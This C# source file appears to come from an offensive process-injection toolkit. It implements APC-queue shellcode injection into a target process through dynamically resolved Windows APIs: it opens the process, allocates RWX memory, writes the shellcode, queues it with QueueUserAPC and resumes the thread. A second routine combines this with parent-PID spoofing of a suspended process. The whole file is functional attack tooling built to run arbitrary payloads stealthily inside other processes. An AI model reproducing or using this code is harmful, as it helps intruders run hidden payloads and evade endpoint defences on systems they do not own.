using ProcessInjection.DInvoke.Native;
using System;
using System.Runtime.InteropServices;
using static ProcessInjection.Utils.Utils;
namespace ProcessInjection.DInvoke
{
    public class APCQueue
    {

        public static void DynamicAPCInject(int pid, int threadid, byte[] buf)
        {
            uint lpNumberOfBytesWritten = 0;

            try
            {
                PrintInfo($"[+] Obtaining the handle for the process id {pid}.");
                var funcParams = new object[] {
                    (uint)DInvoke.Native.Enum.ProcessAccessRights.All,
                    false,
                    (uint)pid
                };

                var pHandle = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "OpenProcess",
                    typeof(DInvoke.Native.Delegates.OpenProcess),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Handle {pHandle} opened for the process id {pid}.");

                PrintInfo($"[+] Allocating memory to inject the shellcode.");

                funcParams = new object[] {
                    pHandle,
                    IntPtr.Zero,
                    (uint)buf.Length,
                    (uint)DInvoke.Native.Enum.MemAllocation.MEM_RESERVE | (uint)DInvoke.Native.Enum.MemAllocation.MEM_COMMIT, 
                    (uint)DInvoke.Native.Enum.MemProtect.PAGE_EXECUTE_READWRITE
                };

                var rMemAddress = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "VirtualAllocEx",
                    typeof(DInvoke.Native.Delegates.VirtualAllocEx),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");


                PrintInfo($"[+] Writing the shellcode at the allocated memory location.");

                funcParams = new object[] {
                    pHandle,
                    rMemAddress,
                    buf,
                    (uint)buf.Length,
                    lpNumberOfBytesWritten
                };

                var status = (bool)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "WriteProcessMemory",
                    typeof(DInvoke.Native.Delegates.WriteProcessMemory),
                    ref funcParams,
                    true);

                if (status)
                {
                    PrintInfo($"[+] Shellcode written in the process memory.");

                    funcParams = new object[] {
                        DInvoke.Native.Enum.ThreadAccess.THREAD_ALL,
                        false, 
                        (uint)threadid
                    };

                    var tHandle = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "OpenThread",
                        typeof(DInvoke.Native.Delegates.OpenThread),
                        ref funcParams,
                        true);

                    PrintInfo($"[!] Add the thread {tHandle} to queue for execution when it enters an alertable state.");

                    funcParams = new object[] {
                        rMemAddress, 
                        tHandle, 
                        IntPtr.Zero
                    };

                    var ptr = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "QueueUserAPC",
                        typeof(DInvoke.Native.Delegates.QueueUserAPC),
                        ref funcParams,
                        true);

                    PrintInfo($"[!] Resume the thread {tHandle}");

                    funcParams = new object[] {
                        tHandle
                    };

                    DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "ResumeThread",
                        typeof(DInvoke.Native.Delegates.ResumeThread),
                        ref funcParams,
                        true);

                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintError($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
                }

                funcParams = new object[] {
                    pHandle
                    };

                var closed = DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "CloseHandle",
                    typeof(DInvoke.Native.Delegates.CloseHandle),
                    ref funcParams,
                    true);
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
        }

        public static void PPIDDynAPCInject(string binary, byte[] shellcode, int parentpid)
        {
            DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
            Structs.PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
            DynamicAPCInject(pinf.dwProcessId, pinf.dwThreadId, shellcode);
        }


        public static Structs.PROCESS_INFORMATION StartProcess(string binaryPath)
        {

            var procInfo = new Structs.PROCESS_INFORMATION();

            var siEx = new DInvoke.Native.Structs.STARTUPINFOEX();

            var ps = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
            var ts = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();

            var funcParams = new object[]
                {
                    null,
                    binaryPath,
                    ps,
                    ts,
                    false,
                    DInvoke.Native.Constants.CreateSuspended,
                    IntPtr.Zero,
                    null,
                    siEx,
                    procInfo
                };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CreateProcessA",
                typeof(DInvoke.Native.Delegates.CreateProcess),
                ref funcParams,
                true);

            procInfo = (DInvoke.Native.Structs.PROCESS_INFORMATION)funcParams[9];

            PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");

            return procInfo;
        }
    }
}
